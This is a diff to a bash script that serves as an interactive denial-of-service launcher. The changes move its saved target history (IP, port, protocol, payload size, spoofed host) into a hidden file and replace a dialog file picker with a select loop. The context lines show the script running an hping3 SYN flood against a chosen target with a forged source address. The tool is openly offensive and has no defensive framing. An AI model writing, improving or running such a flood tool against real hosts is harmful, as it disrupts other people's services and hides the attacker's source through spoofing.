@@ -1,9 +1,9 @@
 #!/bin/bash
-LAST_IP=`cat ~/.dos_history/last_dos | grep -w 'Last_IP:' | awk '{printf $2}'`
-LAST_PROTOCOL=`cat ~/.dos_history/last_dos | grep -w 'Last_Protocol:' | awk '{printf $2}'`
-LAST_PORT=`cat ~/.dos_history/last_dos | grep -w 'Last_Port:' | awk '{printf $2}'`
-LAST_PAYLOAD_SIZE=`cat ~/.dos_history/last_dos | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
-LAST_SPOOF_HOST=`cat ~/.dos_history/last_dos | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
+LAST_IP=`cat ~/.dos_history/.last_dos | grep -w 'Last_IP:' | awk '{printf $2}'`
+LAST_PROTOCOL=`cat ~/.dos_history/.last_dos | grep -w 'Last_Protocol:' | awk '{printf $2}'`
+LAST_PORT=`cat ~/.dos_history/.last_dos | grep -w 'Last_Port:' | awk '{printf $2}'`
+LAST_PAYLOAD_SIZE=`cat ~/.dos_history/.last_dos | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
+LAST_SPOOF_HOST=`cat ~/.dos_history/.last_dos | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
 UDP=off
 TCP=off
 SYN=off
@@ -48,13 +48,18 @@ if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
     func_history
 fi
 if [ "$1" = "History" ] || [ "$1" = "history" ]; then
-    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
+    LAST_DIR=`pwd`
+    cd ~/.dos_history/
+    select DOS_SESSION in *; do
+#    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
     LAST_IP=`cat ${DOS_SESSION} | grep -w 'Last_IP:' | awk '{printf $2}'`
     LAST_PROTOCOL=`cat ${DOS_SESSION} | grep -w 'Last_Protocol:' | awk '{printf $2}'`
     LAST_PORT=`cat ${DOS_SESSION} | grep -w 'Last_Port:' | awk '{printf $2}'`
     LAST_PAYLOAD_SIZE=`cat ${DOS_SESSION} | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
     LAST_SPOOF_HOST=`cat ${DOS_SESSION} | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
     func_history
+    done
+    cd ${LAST_DIR}
 fi
 #7:58PM 13/01/2012
 opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 10 30 3 \
@@ -79,7 +84,7 @@ echo "Generated ${DATE}
 Last_IP: ${IP}
 Last_Port: ${PORT}
 Last_Protocol: ${opt}
-Last_Payload_Size: ${PAYLOAD_SIZE}" | tee ~/.dos_history/last_dos ~/.dos_history/${IP}.history
+Last_Payload_Size: ${PAYLOAD_SIZE}" | tee ~/.dos_history/.last_dos ~/.dos_history/${IP}
 }
 
 function countdown {
@@ -100,7 +105,7 @@ elif [ "${opt}" = "3" ]; then
     main
     SPOOF_HOST=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What host/IP should be spoofed?" 8 40 --stdout`
     echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/${IP}
-    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.last_dos
+    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/.last_dos
     countdown
     hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
 fi
